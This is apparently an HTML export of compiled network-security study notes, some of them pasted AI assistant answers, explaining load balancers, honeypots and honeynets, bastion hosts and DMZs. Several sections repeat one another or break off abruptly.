<p><strong>Increased availability:</strong> Load balancers can help to increase the availability of applications and websites by providing failover protection. If one server fails, the load balancer can automatically redirect traffic to another server, ensuring that the application or website remains accessible.</p>
</li>
<li>
<p><strong>Simplified management:</strong> Load balancers can simplify network management by centralizing the control of multiple servers. This can make it easier to monitor and troubleshoot problems.</p>
</li>
</ul>
<p><strong>Challenges of Load Balancer</strong></p>
<p>Load balancers also have some challenges, including:</p>
<ul>
<li>
<p><strong>Complexity:</strong> Load balancers can be complex to configure and manage. This can require specialized skills and knowledge.</p>
</li>
<li>
<p><strong>Cost:</strong> Load balancers can be expensive to purchase and maintain.</p>
</li>
<li>
<p><strong>Scalability:</strong> Load balancers need to be able to scale to accommodate increasing traffic demands. This can be a challenge for large-scale applications.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>Load balancers are a valuable tool for improving the performance, availability, and scalability of applications and websites. They are widely used by businesses of all sizes to ensure that their online services are always up and running, even in the face of high traffic volumes.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="load-balancer-security"><a class="header" href="#load-balancer-security">Load balancer security</a></h1>
<p>Load balancers are essential tools for distributing traffic across multiple servers, ensuring website or application availability and performance. However, security is a crucial aspect to consider when using load balancers. Here's a breakdown of load balancer security:</p>
<p><strong>Security Benefits of Load Balancers:</strong></p>

</ul>
<p><strong>Additional Security Features of Load Balancers:</strong></p>
<ul>
<li><strong>SSL/TLS Termination:</strong> Some load balancers offer SSL/TLS termination, which can offload the encryption and decryption process from individual servers, potentially improving performance and security.</li>
<li><strong>Health Checks:</strong> Regularly performing health checks on backend servers ensures the load balancer only routes traffic to healthy and functioning servers.</li>
<li><strong>IP Filtering:</strong>  Load balancers can be configured to allow or block traffic from specific IP addresses, adding an extra layer of control.</li>
</ul>
<p><strong>Conclusion:</strong></p>
<p>Load balancers offer significant benefits for website and application performance and availability. However, security considerations are paramount. By implementing secure configurations, staying updated, and integrating load balancers with a layered security approach, you can ensure they enhance your overall security posture.</p>
<p>Securing a load balancer is crucial to ensuring the availability, reliability, and integrity of applications and services distributed across multiple servers. Here are key considerations for load balancer security:</p>
<ol>
<li>
<p><strong>Access Control</strong>: Restrict access to the load balancer management interface and administrative functions to authorized personnel only. Implement strong authentication mechanisms, such as multifactor authentication (MFA) and role-based access control (RBAC), to prevent unauthorized access to configuration settings, monitoring tools, and logging data.</p>
</li>
<li>
<p><strong>Secure Configuration</strong>: Harden the configuration of the load balancer to minimize potential security vulnerabilities and reduce the attack surface. Disable unnecessary services, ports, and protocols, and apply security best practices, such as using secure SSL/TLS cipher suites, enforcing HTTPS for web-based interfaces, and enabling security features like HTTP strict transport security (HSTS) and X-Frame-Options headers.</p>
</li>
<li>
<p><strong>Patch Management</strong>: Keep the load balancer firmware or software up-to-date with the latest security patches, updates, and bug fixes to address known vulnerabilities and mitigate security risks. Establish a regular patch management process to assess, test, and deploy updates promptly without disrupting load balancing functionality or network connectivity.</p>
</li>
<li>
<p><strong>Encryption and SSL Offloading</strong>: Implement SSL/TLS encryption for traffic between clients and the load balancer to protect sensitive data from eavesdropping and tampering. Consider offloading SSL/TLS termination to the load balancer to reduce the computational overhead on backend servers and improve performance. Ensure that private keys and certificates are stored securely and regularly rotated to prevent compromise.</p>
</li>
<li>
<p><strong>Traffic Filtering and DDoS Protection</strong>: Use the load balancer's built-in firewall capabilities, access control lists (ACLs), and rate-limiting features to filter incoming traffic, block malicious requests, and mitigate distributed denial-of-service (DDoS) attacks. Implement IP whitelisting, blacklisting, and geolocation-based blocking to restrict access to known sources of malicious activity and unauthorized users.</p>
</li>
<li>
<p><strong>Monitoring and Logging</strong>: Enable logging and monitoring capabilities to track load balancer performance, health, and security events in real-time. Monitor traffic patterns, server health checks, and error logs for signs of abnormal behavior, traffic spikes, or security incidents.

<p>GitHub Copilot: A honeypot is a computer system that is set up to act as a decoy to lure cyber attackers, and to detect, deflect, or study attempts to gain unauthorized access to information systems. Honeypots are designed to mimic systems that an attacker would like to break into but limit the intruder from having access to an entire network.</p>
<p>Here's a simplified explanation of how a honeypot works:</p>
<ol>
<li>
<p><strong>Setup and Deployment</strong>: A honeypot system is set up to imitate a potential target for attackers. This could be a server, a database, a user's workstation, or any other part of a network. The honeypot is isolated and monitored closely.</p>
</li>
<li>
<p><strong>Lure</strong>: The honeypot is designed to be attractive to attackers. It might appear to contain sensitive information, have a known vulnerability, or otherwise be a tempting target for an attacker.</p>
</li>
<li>
<p><strong>Detection</strong>: When an attacker interacts with the honeypot, their activities are logged and alerts can be generated. Because there should be no legitimate traffic to the honeypot, any activity is considered suspicious.</p>
</li>
<li>
<p><strong>Analysis</strong>: The data collected about the attacker's methods and behaviors can be used to strengthen security measures, develop new defenses, and understand emerging threats.</p>
</li>
<li>
<p><strong>Prevention</strong>: By engaging attackers, honeypots can distract them from more valuable targets in your network. They can also help in detecting attacks at an early stage to prevent them from reaching their real targets.</p>
</li>
</ol>
<p>Remember, while honeypots can be a valuable part of a security strategy, they should be used in conjunction with other security measures. They require careful management to ensure that they don't inadvertently expose real systems or data to attackers.</p>
<p>A honeypot is a cybersecurity mechanism designed to detect and study unauthorized or malicious activities on a network or system by luring potential attackers into a controlled environment. Honeypots are used to gain insights into the tactics, techniques, and motivations of attackers, as well as to enhance network security. Here's how a honeypot works and its key components:</p>
<p><strong>How a Honeypot Works</strong>:</p>
<ol>
<li>
<p><strong>Deployment</strong>: A honeypot is deliberately deployed within a network or on the internet to appear as a tempting target for attackers. It mimics a vulnerable or valuable system or service that may be of interest to attackers. The honeypot is intentionally made to appear less secure than other legitimate systems.</p>
</li>
<li>
<p><strong>Monitoring and Logging</strong>: The honeypot constantly monitors incoming network traffic, interactions, and activities. It logs all interactions and any attempts to access or compromise the system.</p>
</li>
<li>
<p><strong>Deception</strong>: Honeypots use deception to appear attractive to attackers. This deception can include emulating known vulnerabilities, leaving open ports, and using enticing names or services. The goal is to entice attackers to engage with the honeypot.</p>
</li>
<li>
<p><strong>Alert Generation</strong>: When the honeypot detects suspicious or malicious activities, it generates alerts or notifications to security administrators. These alerts provide information about the type of attack, the source IP address, and the methods used.</p>
</li>
<li>
<p><strong>Data Collection</strong>: Honeypots collect data about the attacker's actions, such as their tactics, the tools they use, and the vulnerabilities they target. This data can be invaluable for understanding new and emerging threats.</p>
</li>
<li>
<p><strong>Isolation</strong>: To prevent attackers from pivoting from the honeypot to other parts of the network, honeypots are typically isolated from the rest of the network. They do not contain sensitive data or real assets, reducing the risk of compromise.</p>
</li>
<li>
<p><strong>Analysis and Learning</strong>: Security analysts study the data collected from the honeypot to gain insights into the attacker's behavior and intent. This information can be used to improve network security, develop countermeasures, and enhance threat intelligence.</p>
</li>
</ol>
<p><strong>Types of Honeypots</strong>:</p>
<ol>
<li>
<p><strong>Low-Interaction Honeypots</strong>: These honeypots simulate vulnerabilities at a minimal level. They do not expose a real operating system or application. Instead, they emulate services and record interactions without allowing attackers to compromise a real system.</p>
</li>
<li>
<p><strong>High-Interaction Honeypots</strong>: High-interaction honeypots use real operating systems and applications, exposing attackers to a genuine environment. While they offer more valuable data, they are riskier to deploy as they can be compromised.</p>
</li>
<li>
<p><strong>Research Honeypots</strong>: Research honeypots are used for studying and understanding specific threats or attacker behavior. They are often customized for specific research purposes.</p>
</li>
</ol>

</li>
</ol>
<p>Remember, while honeynets can be a valuable part of a security strategy, they should be used in conjunction with other security measures. They require careful management to ensure that they don't inadvertently expose real systems or data to attackers.</p>
<p>A honeynet is a network of intentionally vulnerable systems and resources designed to attract and trap malicious actors, often used for the purpose of studying and analyzing cyber threats and attack techniques. Unlike a single honeypot, a honeynet is a more extensive setup that consists of multiple interconnected honeypots and other devices. The primary purpose of a honeynet is to gain insights into the behavior, tactics, and tools used by attackers in a controlled environment. Here's how a honeynet works and its key components:</p>
<p><strong>How a Honeynet Works</strong>:</p>
<ol>
<li>
<p><strong>Deployment</strong>: A honeynet is created by deploying a network of intentionally insecure systems and services. These systems often mimic real-world assets and vulnerabilities, making them attractive to potential attackers.</p>
</li>
<li>
<p><strong>Monitoring and Data Collection</strong>: The honeynet constantly monitors network traffic and activities on the interconnected systems. It records all interactions, including intrusion attempts, reconnaissance activities, and lateral movement by attackers.</p>
</li>
<li>
<p><strong>Deception</strong>: Honeynets use deception to appear as legitimate targets. This deception can include simulating known vulnerabilities, leaving open ports, and using enticing names or services.</p>
</li>
<li>
<p><strong>Isolation</strong>: To protect the rest of the network, honeynets are typically isolated from other parts of the network. They do not contain sensitive data or real assets, reducing the risk of compromise.</p>
</li>
<li>

<p>GitHub Copilot: A Bastion host is a special-purpose computer on a network specifically designed and configured to withstand attacks. It's often a critical part of a secure network configuration, serving as a platform to access the internal network from an external network, typically the internet.</p>
<p>Here's a simplified explanation of how it works:</p>
<ol>
<li>The Bastion host is placed outside the network's firewall in a single-factor authentication zone.</li>
<li>It's configured to access the internal network through a communication protocol, like SSH or RDP.</li>
<li>Users connect to the Bastion host, usually with a username and password.</li>
<li>Once connected, users can then use the Bastion host to connect to other hosts on the private network.</li>
</ol>
<p>Remember, as an AI programming assistant, my expertise is in software development. For more detailed information about network security and infrastructure, you may want to consult resources or experts in those areas.</p>
<p>A bastion host, also known as a jump host or a jump server, is a specialized computer on a network specifically designed and configured to withstand attacks. It acts as a secure gateway that provides controlled access to other systems within a private network. The primary purpose of a bastion host is to enhance security by reducing the attack surface and limiting the direct exposure of sensitive systems to potential threats.</p>
<p>Here's how a bastion host typically works:</p>
<ol>
<li>
<p><strong>Controlled Access Point:</strong> The bastion host serves as a single controlled access point to reach other servers or systems within a private network. Users must first connect to the bastion host before being allowed access to other internal resources.</p>
</li>
<li>
<p><strong>Authentication and Authorization:</strong> Users connecting to the bastion host need to authenticate themselves using secure methods such as SSH (Secure Shell) or other secure protocols. Once authenticated, users may need to provide additional credentials or undergo further authorization processes to access specific systems.</p>
</li>
<li>
<p><strong>Firewall and Security Measures:</strong> The bastion host is usually heavily fortified with security measures, including firewalls, intrusion detection systems, and other security software. This helps in preventing unauthorized access and protecting the internal network.</p>
</li>
<li>
<p><strong>Logging and Monitoring:</strong> Bastion hosts typically have robust logging and monitoring systems in place. This allows administrators to keep track of who is accessing the network, when, and what activities they are performing. It aids in detecting and responding to potential security incidents.</p>
</li>
<li>
<p><strong>Minimal Software and Services:</strong> To reduce the attack surface, a bastion host is configured with minimal software and services. Unnecessary services and applications are disabled to decrease the risk of vulnerabilities.</p>
</li>
<li>
<p><strong>Isolation:</strong> The bastion host is often placed in a separate network segment, known as a DMZ (demilitarized zone), which acts as a buffer zone between the internal network and the external (untrusted) network, such as the internet. This helps to contain and mitigate potential security threats.</p>
</li>
<li>
<p><strong>Secure Communication Channels:</strong> Communication between the user and the bastion host, as well as between the bastion host and other internal systems, is encrypted to ensure the confidentiality and integrity of the data being transmitted.</p>
</li>
</ol>
<p>Overall, the bastion host plays a crucial role in enhancing the security posture of a network by controlling and monitoring access to internal systems. It adds an additional layer of defense against unauthorized access and potential cyber threats.</p>
<p>A <strong>Bastion host</strong> is a special-purpose server or an instance that is designed to withstand attacks⁴. It's also known as a 'jump box' and acts like a proxy server, allowing client machines to connect to a remote server¹. It serves as a gateway between a private subnet and the internet, enabling users to connect to a private network from an external network¹².</p>
<p>Here's how a Bastion host works:</p>
<ol>
<li>A Bastion host provides an entry point into private networks that need to be connected to an external network, securing them from attacks¹.</li>
<li>It has both internal and external IP addresses¹.</li>
<li>If users want to connect to an internal instance without using external IP addresses, they can connect to a Bastion host and then connect to the internal instances from that Bastion host¹.</li>
<li>While using Bastion service, users have to first log in to the Bastion host and then they are directed to the private instances¹.</li>
</ol>
<p>In a typical scenario, a company's administrators might need access to Linux instances connected on a subnet within a virtual private cloud². Instead of exposing a port in each instance to the public internet, a Bastion host is used as a bridge between the public internet and the private subnet². The Bastion runs as a locked-down, single-purpose system². Administrators strip the Bastion of all unnecessary applications, ports, processes, user accounts, and protocols². Everything that does not serve the Bastion host’s single purpose gets disabled or deleted².</p>
<p>In summary, Bastion hosts are crucial for enhancing security in network architectures by providing a secure pathway for accessing internal network resources from external networks¹².</p>

<ul>
<li>A large enterprise has a complex network infrastructure with various servers and applications spread across multiple data centers.</li>
<li>The IT team requires secure access to manage these systems for various purposes like configuration, troubleshooting, and security monitoring.</li>
<li>The enterprise implements multiple bastion hosts strategically placed within their network, potentially in a DMZ (Demilitarized Zone) for added isolation.</li>
<li>Bastion hosts are configured with specific access controls, allowing authorized personnel to connect to designated internal systems based on their roles and permissions.</li>
</ul>
<p><strong>Benefits of Bastion Hosts in these Examples:</strong></p>
<ul>
<li><strong>Centralized Access:</strong>  Both scenarios benefit from a centralized access point for remote management. This simplifies user management and allows for better control over who can access internal systems.</li>
<li><strong>Improved Security:</strong> By limiting direct access to internal servers, bastion hosts reduce the attack surface and make it more difficult for attackers to breach the network.</li>
<li><strong>Compliance:</strong> Bastion hosts can be helpful for organizations that need to comply with regulations that mandate secure access controls for sensitive data.</li>
</ul>
<p><strong>Additional Considerations:</strong></p>
<ul>
<li><strong>Bastion Host Hardware/Software:</strong> Bastion hosts can be implemented on dedicated hardware or virtual machines. The choice depends on factors like budget, scalability needs, and existing infrastructure.</li>
<li><strong>Open-Source vs. Commercial Bastion Host Solutions:</strong> There are open-source software options available to configure a bastion host, but some organizations might opt for commercially supported solutions with additional features and management tools.</li>
</ul>
<p>By understanding how bastion hosts function and the security practices involved, organizations can leverage them to create a more secure and controlled access environment for their critical systems.</p>
<p>Here are a few examples of bastion host setups commonly used in various environments:</p>
<ol>
<li>
<p><strong>SSH Bastion Host</strong>:</p>
<ul>
<li><strong>Description</strong>: A Linux server configured as an SSH bastion host, providing secure access to internal servers located within a private network. External users connect to the bastion host via SSH, and then SSH into internal servers using port forwarding or SSH agent forwarding.</li>
<li><strong>Implementation</strong>: Configure the bastion host with hardened security measures, such as disabling password authentication, enforcing key-based authentication, and limiting access to authorized users via firewall rules or TCP wrappers. Use SSH bastion host software like <code>bastillion</code> or <code>teleport</code> to simplify management and enhance security features.</li>
</ul>
</li>
<li>
<p><strong>JumpBox</strong>:</p>
<ul>
<li><strong>Description</strong>: A virtual machine deployed in a public cloud environment (e.g., AWS, Azure, Google Cloud) acting as a jump host for administrators to access private instances or resources within a Virtual Private Cloud (VPC). Administrators connect to the jumpbox using SSH or Remote Desktop Protocol (RDP) and then access internal resources.</li>
<li><strong>Implementation</strong>: Secure the jumpbox by restricting access to specific IP addresses or IP ranges, enforcing strong authentication methods, and regularly updating the operating system and software. Implement network ACLs or security groups to control traffic flow to and from the jumpbox.</li>
</ul>
</li>
<li>
<p><strong>Proxy Server Bastion Host</strong>:</p>
<ul>
<li><strong>Description</strong>: A proxy server configured as a bastion host to provide controlled access to internal web applications, services, or databases. External users connect to the proxy server and authenticate themselves before accessing internal resources through reverse proxying or forward proxying.</li>
<li><strong>Implementation</strong>: Deploy a reverse proxy server such as NGINX or Apache HTTP Server as the bastion host, configure SSL/TLS termination for encrypted connections, and enforce access controls based on user authentication or IP whitelisting. Monitor and log user activity for auditing and security analysis purposes.</li>
</ul>
</li>
<li>
<p><strong>VPN Bastion Host</strong>:</p>
<ul>
<li><strong>Description</strong>: A dedicated VPN server deployed as a bastion host to provide secure remote access to internal networks and resources for remote users or remote offices. External users establish VPN connections to the bastion host, which authenticates and encrypts traffic before granting access to internal resources.</li>
<li><strong>Implementation</strong>: Deploy VPN software such as OpenVPN, IPsec, or WireGuard on the bastion host, configure user authentication using certificates or credentials, and enforce VPN client security policies (e.g., endpoint compliance checks). Implement network segmentation to restrict access to specific subnets or services based on user roles or permissions.</li>
</ul>
</li>
</ol>
<p>These examples demonstrate different use cases and configurations of bastion hosts to provide secure access to internal networks, servers, and resources from external networks or remote locations. Bastion hosts play a crucial role in enhancing network security by controlling and monitoring access to sensitive systems and data.</p>

<p>GitHub Copilot: A DMZ, or Demilitarized Zone, in the context of network architecture, is a physical or logical subnetwork that separates an organization's internal network from an untrusted network, usually the internet. It provides an additional layer of security.</p>
<p>Here's a simplified explanation of how it works:</p>
<ol>
<li>The DMZ is placed between the internet and the internal network's firewall.</li>
<li>Servers that are accessible from the internet, like web servers and mail servers, are usually placed in the DMZ.</li>
<li>If an attacker manages to compromise a server in the DMZ, the attacker does not have direct access to the internal network. They would need to breach another firewall to access the internal network.</li>
<li>Traffic from the internet to the DMZ is allowed, while traffic from the DMZ to the internal network is heavily restricted.</li>
</ol>
<p>Remember, as an AI programming assistant, my expertise is in software development. For more detailed information about network security and infrastructure, you may want to consult resources or experts in those areas.</p>
<p>A DMZ, or Demilitarized Zone, is a network segment that is designed to provide an additional layer of security by separating an organization's internal network from an untrusted external network, such as the internet. The purpose of a DMZ is to create a buffer zone that adds an extra layer of protection for critical assets, such as servers that need to be accessible from the internet, while isolating them from the more sensitive internal network.</p>
<p>Here's how a DMZ typically works:</p>
<ol>
<li>
<p><strong>Isolation:</strong> The DMZ is a physically or logically isolated network segment that sits between the internal network and the external network (usually the internet). This separation helps to contain and mitigate potential security threats that may come from the outside.</p>
</li>
<li>
<p><strong>Placement of Servers:</strong> Servers that need to be accessible from the internet, such as web servers, email servers, or public-facing application servers, are placed in the DMZ. These servers are exposed to external users and potential threats.</p>
</li>
<li>
<p><strong>Security Measures:</strong> The DMZ is configured with heightened security measures, including firewalls, intrusion detection/prevention systems, and other security appliances. These devices are responsible for monitoring and controlling the traffic that passes between the internal network, the DMZ, and the external network.</p>
</li>
<li>
<p><strong>Bastion Hosts:</strong> As mentioned in the previous response, a bastion host is often placed in the DMZ. It acts as a secure gateway for external users to access specific services or resources within the internal network. The bastion host adds an extra layer of authentication and authorization before allowing access to internal resources.</p>
</li>
<li>
<p><strong>Traffic Filtering:</strong> Firewalls are used to filter and control the traffic entering and leaving the DMZ. Ingress traffic from the internet is inspected, and only necessary and authorized traffic is allowed to reach the servers in the DMZ. Outbound traffic from the internal network to the internet is also controlled to prevent unauthorized access.</p>
</li>
<li>
<p><strong>Monitoring and Logging:</strong> The DMZ is equipped with monitoring and logging systems to keep track of network activity, detect potential security incidents, and facilitate forensic analysis in the event of a security breach.</p>
</li>
<li>
<p><strong>Redundancy and High Availability:</strong> Critical servers in the DMZ may be configured for redundancy and high availability to ensure continuous service availability, even in the face of hardware failures or attacks.</p>
</li>
</ol>
<p>In summary, a DMZ acts as a secure intermediary zone that helps protect the internal network from external threats. It is a common architectural component in network security strategies, providing a means to securely expose services to the internet while minimizing the risk to the internal network.</p>
<p>A <strong>DMZ (Demilitarized Zone)</strong> is a subnet that creates an extra layer of protection from external attacks¹². It's a perimeter network that protects and adds an extra layer of security to an organization’s internal local-area network (LAN) from untrusted traffic¹.</p>
<p>Here's how a DMZ works:</p>
<ol>
<li>A DMZ network provides a buffer between the internet and an organization’s private network¹.</li>
<li>The DMZ is isolated by a security gateway, such as a firewall, that filters traffic between the DMZ and a LAN¹.</li>
<li>The default DMZ server is protected by another security gateway that filters traffic coming in from external networks¹.</li>
<li>It is ideally located between two firewalls, and the DMZ firewall setup ensures incoming network packets are observed by a firewall—or other security tools—before they make it through to the servers hosted in the DMZ¹.</li>
<li>If an attacker is able to penetrate the external firewall and compromise a system in the DMZ, they then also have to get past an internal firewall before gaining access to sensitive corporate data¹.</li>
</ol>
<p>In a typical scenario, a company's administrators might need access to a public website that customers use¹. To protect the corporate local area network, the web server is installed on a separate computer from internal resources¹. The DMZ enables communication between protected business resources, like internal databases, and qualified traffic from the Internet¹.</p>
<p>In summary, DMZ networks are crucial for enhancing security in network architectures by providing a secure pathway for accessing internal network resources from external networks¹².</p>

<p>DMZ, which stands for &quot;demilitarized zone,&quot; is a network security strategy that creates a buffer zone between a trusted internal network and a less-trusted external network, such as the internet. It serves as a protective barrier, isolating internal resources from direct exposure to the external network, thus minimizing the potential impact of cyberattacks.</p>
<p>In a DMZ network, public-facing services, such as web servers, email servers, and DNS servers, are placed within the DMZ, exposed to the external network. This allows these services to be accessible to external users while protecting the internal network from unauthorized access.</p>
<p><strong>How DMZ Works</strong></p>
<ol>
<li>
<p><strong>Network Segmentation:</strong> The DMZ is physically or logically separated from the internal network, creating a distinct boundary between the two networks.</p>
</li>
<li>
<p><strong>Firewalls:</strong> Firewalls are implemented on both sides of the DMZ to control traffic flow and restrict access. The external firewall filters incoming traffic to the DMZ, allowing only authorized connections, while the internal firewall filters outgoing traffic from the DMZ to the internal network.</p>
</li>
<li>
<p><strong>Access Control:</strong> Access to the DMZ is tightly controlled, typically requiring strong authentication and authorization mechanisms. Only authorized users or systems are permitted to access the DMZ, and their access is restricted to specific resources.</p>
</li>
<li>
<p><strong>Monitoring and Logging:</strong> Activities within the DMZ are closely monitored and logged to detect suspicious behavior and potential attacks. This enables security personnel to identify and respond to intrusions promptly.</p>
</li>
</ol>
<p><strong>Benefits of DMZ Implementation</strong></p>
<ol>
<li>
<p><strong>Enhanced Security:</strong> The DMZ isolates the internal network from direct exposure to the external network, reducing the attack surface and minimizing the potential impact of cyberattacks.</p>
</li>
<li>
<p><strong>Controlled Access:</strong> Access to the DMZ is restricted, preventing unauthorized users from accessing internal resources. This helps to protect sensitive data and systems from unauthorized access.</p>
</li>
<li>
<p><strong>Improved Monitoring:</strong> Activities within the DMZ are closely monitored, enabling the early detection of suspicious behavior and potential attacks.</p>
</li>
<li>
<p><strong>Simplified Network Management:</strong> By isolating the DMZ, network administrators can manage internal and external networks separately, simplifying network configurations and firewall rules.</p>
</li>
</ol>
<p><strong>Examples of DMZ Usage</strong></p>
<ul>
<li>
<p><strong>Hosting Public Websites:</strong> Web servers are typically placed within the DMZ to allow public access to websites while protecting internal servers and data.</p>
</li>
<li>
<p><strong>Providing Email Services:</strong> Email servers can be located in the DMZ to enable email communication while safeguarding internal mail systems.</p>
</li>
<li>
<p><strong>Accessing External Resources:</strong> DMZ-based proxy servers can be used to control and secure access to external resources, such as websites or cloud services.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>DMZ is a valuable network security strategy that enhances security by creating a buffer zone between trusted and less-trusted networks. By implementing DMZ, organizations can protect their internal networks from unauthorized access and minimize the impact of cyberattacks.</p>

<p>A Demilitarized Zone (DMZ) acts as a buffer zone between your trusted internal network and the untrusted public internet. By placing specific servers and services within the DMZ, you can provide controlled access to external entities while safeguarding your critical internal systems. Here's a breakdown of essential security practices for a secure network DMZ:</p>
<p><strong>Securing Your Network DMZ:</strong></p>
<ul>
<li><strong>Limited Placement:</strong>  Only place essential public-facing servers and services in the DMZ, such as web servers, email servers, or DNS servers. Avoid placing critical internal systems like databases or file servers within the DMZ.</li>
<li><strong>Firewalls:</strong> Implement robust firewalls with strict rules to control traffic flow between the DMZ, the internal network, and the internet.</li>
<li><strong>Network Segmentation:</strong>  Segment the DMZ further using firewalls or VLANs to isolate different types of servers and services within the DMZ itself. This additional layer of control can prevent lateral movement within the DMZ if a server is compromised.</li>
<li><strong>Intrusion Detection/Prevention Systems (IDS/IPS):</strong> Deploy intrusion detection or prevention systems within the DMZ to monitor network traffic for suspicious activity and potential attacks.</li>
<li><strong>Vulnerability Management:</strong>  Regularly scan and patch vulnerabilities on all servers and services located within the DMZ. Prioritize updates for internet-facing systems as they are more susceptible to attack.</li>
<li><strong>Strong Passwords &amp; MFA:</strong>  Enforce strong password policies and implement Multi-Factor Authentication (MFA) for all administrative access to servers within the DMZ.</li>
</ul>
<p><strong>Additional Network DMZ Security Considerations:</strong></p>
<ul>
<li><strong>DMZ Logging:</strong>  Enable and monitor logs from devices within the DMZ to identify suspicious activity, login attempts, and potential security incidents.</li>
<li><strong>Penetration Testing:</strong>  Consider periodic penetration testing of the DMZ and its firewalls to simulate real-world attacks and identify potential security weaknesses.</li>
<li><strong>DMZ Monitoring:</strong>  Continuously monitor the health and performance of servers within the DMZ to ensure they are functioning properly and no unauthorized modifications have occurred.</li>
<li><strong>Least Privilege:</strong> Grant users only the minimum level of access required to perform their tasks within the DMZ. Avoid using privileged accounts for everyday tasks.</li>
<li><strong>Secure Development Practices:</strong> If developing web applications or services to be deployed in the DMZ, prioritize secure coding practices to minimize vulnerabilities.</li>
</ul>
<p><strong>Benefits of a Secure Network DMZ:</strong></p>
<ul>
<li><strong>Enhanced Security:</strong> A secure DMZ adds an extra layer of defense between your internal network and the internet, making it more difficult for attackers to breach your critical systems.</li>
<li><strong>Controlled Access:</strong> The DMZ allows you to provide controlled access to external entities like customers or partners who need to access specific services without granting them direct access to your internal network.</li>
<li><strong>Improved Performance:</strong> By offloading internet-facing traffic from your internal network to the DMZ, you can potentially improve overall network performance for internal users.</li>
</ul>
<p><strong>Conclusion:</strong></p>
<p>A well-secured network DMZ plays a vital role in creating a layered security architecture for your organization. By following these security best practices, you can establish a secure zone for your internet-facing services while safeguarding your internal network from potential threats. Remember, DMZ security is an ongoing process that requires continuous monitoring, maintenance, and adaptation to evolving cyber threats. </p>
<p>A DMZ (Demilitarized Zone) is a network segment that sits between an organization's internal network (intranet) and an external network (typically the internet). The DMZ is designed to provide a layer of security by placing certain services and systems that need to be accessible from the internet in an isolated zone, separate from the internal network. Here are some security considerations for managing a DMZ effectively:</p>
<ol>
<li>
<p><strong>Segregation and Isolation</strong>: Implement strict network segmentation to isolate the DMZ from the internal network and other sensitive systems. Use firewalls, routers, and network access controls to enforce traffic restrictions and prevent unauthorized access between the DMZ and internal networks. Limit communication between DMZ systems and only allow necessary traffic flows.</p>
</li>
<li>
<p><strong>Defense in Depth</strong>: Apply defense-in-depth principles to secure the DMZ against potential threats and attacks. Deploy multiple layers of security controls, such as firewalls, intrusion detection/prevention systems (IDS/IPS), antivirus/antimalware solutions, and application-level gateways (e.g., web application firewalls), to detect and block malicious activity targeting DMZ services and systems.</p>
</li>
<li>
<p><strong>Hardened Configuration</strong>: Configure DMZ systems and services with hardened security settings to reduce the attack surface and mitigate security risks. Apply security best practices, such as disabling unnecessary services, applying security patches and updates regularly, and using strong authentication mechanisms (e.g., SSH keys, multi-factor authentication) to secure access to DMZ systems.</p>
</li>
<li>
<p><strong>Service Specific Security</strong>: Implement specific security measures tailored to the types of services hosted in the DMZ. For example, for web servers, use secure coding practices, SSL/TLS encryption, and web application firewalls (WAFs) to protect against common web-based attacks. For email servers, implement spam filters, email encryption, and email authentication mechanisms (e.g., SPF, DKIM, DMARC) to prevent email-based threats.</p>
</li>
<li>
<p><strong>Monitoring and Logging</strong>: Implement robust monitoring and logging mechanisms to track and analyze activity within the DMZ. Monitor network traffic, system logs, and security events to detect suspicious behavior, unauthorized access attempts, and security incidents in real-time. Configure alerts and notifications to facilitate timely incident response and forensic analysis.</p>
</li>
<li>
<p><strong>Regular Security Assessments</strong>: Conduct regular security assessments, vulnerability scans, and penetration tests to identify and remediate security weaknesses and misconfigurations in the DMZ. Perform security audits and compliance checks to ensure that DMZ systems and configurations adhere to organizational security policies and regulatory requirements.</p>
</li>
<li>
<p><strong>Incident Response Plan</strong>: Develop and document an incident response plan specific to the DMZ to guide response actions in the event of security incidents or breaches. Define roles and responsibilities, escalation procedures, and response actions to facilitate timely detection, containment, and mitigation of security threats targeting the DMZ.</p>
</li>
</ol>
<p>By implementing these security considerations, organizations can enhance the security posture of their DMZ and mitigate the risk of unauthorized access, data breaches, and cyber attacks originating from external networks. The DMZ plays a critical role in protecting internal networks and assets by providing a secure and controlled environment for hosting externally facing services and systems.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dmz-examples"><a class="header" href="#dmz-examples">DMZ examples</a></h1>
<p>Here are some examples of how organizations might utilize a network DMZ and the types of servers or services commonly placed within it:</p>
<p><strong>Scenario 1: E-commerce Website with Secure Payment Processing</strong></p>
<ul>
<li>An e-commerce website stores customer data and product information on secure servers within their internal network.</li>
<li>To process online payments securely, the company places a web server within the DMZ. </li>
<li>This web server handles customer interactions on the product pages and shopping cart. </li>
<li>However, it  doesn't store sensitive payment information like credit card details.</li>
<li>When a customer reaches the checkout stage, the web server in the DMZ securely transmits the payment data to a dedicated payment processing gateway via an encrypted connection.</li>
<li>The payment gateway handles the transaction and transmits the authorization status back to the web server in the DMZ. </li>
<li>The web server then displays a confirmation message to the customer.</li>
</ul>
<p><strong>Scenario 2: Company with a Public-Facing Web Application</strong></p>
<ul>
<li>A company develops a web application used by external partners or customers. </li>
<li>To isolate this application from their internal network, they deploy it on a server within the DMZ.</li>
<li>The DMZ server can securely communicate with internal systems using firewalls and access controls to retrieve or update necessary data.</li>
<li>Users from outside the company access the web application directly through the DMZ server over the internet.</li>
</ul>
<p><strong>Common Types of Servers in a Network DMZ:</strong></p>
<ul>
<li><strong>Web Servers:</strong> Public-facing web servers hosting websites or web applications are prime candidates for the DMZ.</li>
<li><strong>Mail Servers:</strong> If an organization runs an email server for external communication, it might be placed in the DMZ for controlled access.</li>
<li><strong>DNS Servers:</strong> In some cases, an organization might have a secondary DNS server in the DMZ to handle public DNS queries without exposing the primary internal DNS server.</li>
<li><strong>VPN Gateways:</strong>  An organization might deploy a VPN gateway in the DMZ to provide secure remote access for authorized users without granting them direct access to the internal network.</li>
</ul>
<p><strong>Benefits of Network DMZs in these Examples:</strong></p>
<ul>
<li><strong>Enhanced Security:</strong> By isolating critical data and internal systems from the internet, the DMZ provides an extra layer of protection in both scenarios.</li>
<li><strong>Controlled Access:</strong> The DMZ allows for controlled access to external entities in a secure manner.  In the e-commerce example, customers can securely submit payments without accessing the company's internal network.</li>
<li><strong>Improved Scalability:</strong>  The DMZ can be scaled to accommodate additional internet-facing services as needed by the organization.</li>
</ul>
<p><strong>Remember:</strong> The specific configuration of your network DMZ will depend on your organization's unique needs and security requirements. </p>
<p>A DMZ (Demilitarized Zone) is a network segment that acts as a buffer zone between a trusted internal network (such as a corporate LAN) and an untrusted external network (such as the internet). Here are a few common examples of DMZ configurations:</p>
<ol>
<li>
